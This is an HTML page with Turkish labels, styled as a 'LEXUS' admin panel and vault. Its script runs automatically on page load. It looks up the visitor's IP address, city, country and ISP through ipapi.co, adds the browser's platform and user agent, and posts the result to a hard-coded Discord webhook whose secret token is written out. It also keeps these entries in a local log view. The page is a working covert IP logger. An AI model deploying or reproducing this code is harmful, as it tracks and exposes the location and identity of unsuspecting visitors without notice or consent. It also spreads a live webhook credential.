<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEXUS ADMIN PANEL & VAULT</title>
    <style>
        body { background-color: #000; color: #bc00ff; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .vault-container { border: 1px solid #bc00ff; padding: 20px; box-shadow: 0 0 20px rgba(188, 0, 255, 0.4); background: rgba(10, 0, 15, 0.9); width: 95%; max-width: 800px; margin-bottom: 20px; }
        .header { border-bottom: 1px solid #bc00ff; margin-bottom: 15px; padding-bottom: 10px; font-weight: bold; letter-spacing: 2px; text-align: center; font-size: 1.5rem; }
        
        /* Log Listesi Alanı */
        #log-list { max-height: 400px; overflow-y: auto; text-align: left; font-size: 12px; border: 1px dashed #444; padding: 10px; background: #050005; }
        .log-item { border-bottom: 1px solid #222; padding: 8px 0; color: #00ff00; }
        .log-item span { color: #ff00ff; } /* IP ve Tarih mor olsun */
        
        .status-bar { margin-top: 15px; font-size: 14px; color: #ff0000; text-align: center; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
        
        .controls { margin-top: 20px; }
        .btn { border: 1px solid #ff0000; color: #ff0000; background: none; padding: 10px 20px; cursor: pointer; font-family: inherit; }
        .btn:hover { background: #ff0000; color: #000; }
    </style>
</head>
<body>

    <div class="vault-container">
        <div class="header">[ LEXUS_DATABASE_VAULT_V12 ]</div>
        
        <div id="log-list">
            <div class="log-item">Sistem başlatıldı... Kayıtlar bekleniyor...</div>
        </div>

        <div class="status-bar">
            DURUM: TARAMA MODU AKTİF <span class="blink">_</span>
        </div>

        <div class="controls">
            <button class="btn" onclick="clearLogs()">LOGLARI SIFIRLA</button>
        </div>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1480291700793544774/a8WwCE5IsjTE-p5kwWHuuI9IUGHLYYM1yAYtvz10nbhEljg2abosvDz3y74xzVnBT4eN";

        // Sayfa yüklendiğinde eski logları getir
        window.onload = () => {
            displayLogs();
            collectAndSend();
        };

        async function collectAndSend() {
            try {
                // Bilgileri Topla
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();
                
                const logEntry = {
                    ip: data.ip,
                    city: data.city,
                    isp: data.org,
                    device: navigator.platform,
                    date: new Date().toLocaleString()
                };

                // 1. Webhook'a Gönder
                sendToDiscord(data, logEntry);

                // 2. Admin Paneline (Local Storage) Kaydet
                saveLog(logEntry);

            } catch (err) {
                console.error("Hata:", err);
            }
        }

        function saveLog(entry) {
            let logs = JSON.parse(localStorage.getItem('lexus_logs')) || [];
            logs.unshift(entry); // Yeni logu başa ekle
            localStorage.setItem('lexus_logs', JSON.stringify(logs));
            displayLogs();
        }

        function displayLogs() {
            const logList = document.getElementById('log-list');
            let logs = JSON.parse(localStorage.getItem('lexus_logs')) || [];
            
            if (logs.length > 0) {
                logList.innerHTML = logs.map(l => `
                    <div class="log-item">
                        [${l.date}] <span>GİRİŞ TESPİT EDİLDİ:</span> ${l.ip} - ${l.city} (${l.isp}) - 📱 ${l.device}
                    </div>
                `).join('');
            }
        }

        function clearLogs() {
            if(confirm("Tüm kayıtlar silinsin mi?")) {
                localStorage.removeItem('lexus_logs');
                location.reload();
            }
        }

        async function sendToDiscord(info, entry) {
            const payload = {
                username: "LEXUS ADMIN NOTIFIER",
                embeds: [{
                    title: "⚠️ PANEL GİRİŞİ!",
                    color: 12320255,
                    fields: [
                        { name: "🌐 IP", value: info.ip, inline: true },
                        { name: "📍 Konum", value: `${info.city}/${info.country_name}`, inline: true },
                        { name: "🔌 Sağlayıcı", value: info.org, inline: false },
                        { name: "📱 Sistem", value: navigator.userAgent, inline: false }
                    ],
                    timestamp: new Date()
                }]
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }
    </script>
</body>
</html>
